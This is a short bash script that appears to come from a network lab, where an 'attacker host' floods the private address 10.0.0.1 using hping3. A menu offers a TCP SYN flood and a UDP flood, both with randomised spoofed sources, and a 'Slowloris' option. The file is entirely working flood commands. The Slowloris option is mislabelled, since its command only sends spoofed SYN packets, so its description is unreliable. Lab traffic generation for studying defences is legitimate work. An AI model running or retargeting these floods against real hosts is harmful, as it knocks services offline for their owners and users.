#!/bin/bash
# scripts/attack_gen.sh
# Simulates various DDoS attacks using hping3 from attacker host (h4)

TARGET_IP="10.0.0.1"

echo "Select Attack Type:"
echo "1) TCP SYN Flood"
echo "2) UDP Flood"
echo "3) Slow HTTP (Slowloris)"
read -p "Choice: " choice

case $choice in
  1)
    echo "Launching TCP SYN Flood against $TARGET_IP..."
    hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source $TARGET_IP
    ;;
  2)
    echo "Launching UDP Flood against $TARGET_IP..."
    hping3 --udp --flood --rand-source -p 53 $TARGET_IP
    ;;
  3)
    echo "Launching Slow HTTP attack against $TARGET_IP..."
    # A simple implementation of slow HTTP using hping3 or similar tool
    hping3 -c 1000 -d 120 -S -w 64 -p 80 -k -a 10.0.0.4 $TARGET_IP
    ;;
  *)
    echo "Invalid choice. Exiting."
    ;;
esac
